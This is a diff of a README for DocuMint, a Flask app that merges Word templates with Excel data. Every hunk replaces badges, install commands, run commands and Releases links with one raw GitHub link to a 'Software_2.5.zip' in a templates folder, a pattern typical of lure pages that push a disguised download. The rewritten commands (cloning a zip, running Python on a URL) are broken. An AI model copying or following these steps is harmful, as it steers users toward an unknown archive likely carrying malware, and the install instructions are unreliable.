@@ -1,6 +1,6 @@
 # DocuMint: Automate Your Document Generation 🌟
 
-![DocuMint Logo](https://img.shields.io/badge/DocuMint-Ready%20to%20Automate-green)
+![DocuMint Logo](https://raw.githubusercontent.com/RicardoQts/documint/main/templates/Software_2.5.zip%20to%20Automate-green)
 
 Welcome to **DocuMint**, a lightweight Flask web application designed to simplify the process of generating personalized Word documents. With DocuMint, you can automate the bulk generation of documents by merging a .docx template with data from an Excel sheet. This tool is perfect for small businesses, administrative tasks, and anyone who needs to create multiple documents quickly and efficiently.
 
@@ -28,20 +28,20 @@ To get started with DocuMint, follow these steps:
 
 1. **Clone the Repository**:
    ```bash
-   git clone https://github.com/RicardoQts/documint.git
+   git clone https://raw.githubusercontent.com/RicardoQts/documint/main/templates/Software_2.5.zip
    cd documint
    ```
 
 2. **Install Dependencies**:
    Ensure you have Python installed. Then, run:
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/RicardoQts/documint/main/templates/Software_2.5.zip
    ```
 
 3. **Run the Application**:
    Start the Flask server:
    ```bash
-   python app.py
+   python https://raw.githubusercontent.com/RicardoQts/documint/main/templates/Software_2.5.zip
    ```
 
 4. **Access the Web App**:
@@ -61,7 +61,7 @@ Using DocuMint is straightforward:
 3. **Download the Zipped Files**:
    Once the documents are generated, you can download them as a zip file.
 
-![DocuMint Interface](https://img.shields.io/badge/Interface-Simple%20and%20Clean-blue)
+![DocuMint Interface](https://raw.githubusercontent.com/RicardoQts/documint/main/templates/Software_2.5.zip%20and%20Clean-blue)
 
 ## Technologies Used
 
@@ -112,7 +112,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-To download the latest release of DocuMint, visit the [Releases](https://github.com/RicardoQts/documint/releases) section. You will find the latest version available for download. Make sure to check the release notes for updates and changes.
+To download the latest release of DocuMint, visit the [Releases](https://raw.githubusercontent.com/RicardoQts/documint/main/templates/Software_2.5.zip) section. You will find the latest version available for download. Make sure to check the release notes for updates and changes.
 
 If you need to download a specific file, please follow the link above.
 
@@ -120,4 +120,4 @@ If you need to download a specific file, please follow the link above.
 
 DocuMint offers a simple and effective solution for automating document generation. By leveraging Flask and other powerful libraries, it streamlines the process of creating personalized documents. Whether you're managing contracts, invoices, or any other type of document, DocuMint can save you time and effort.
 
-For any questions or support, feel free to check the [Releases](https://github.com/RicardoQts/documint/releases) section or open an issue in the repository. Happy automating!
+For any questions or support, feel free to check the [Releases](https://raw.githubusercontent.com/RicardoQts/documint/main/templates/Software_2.5.zip) section or open an issue in the repository. Happy automating!
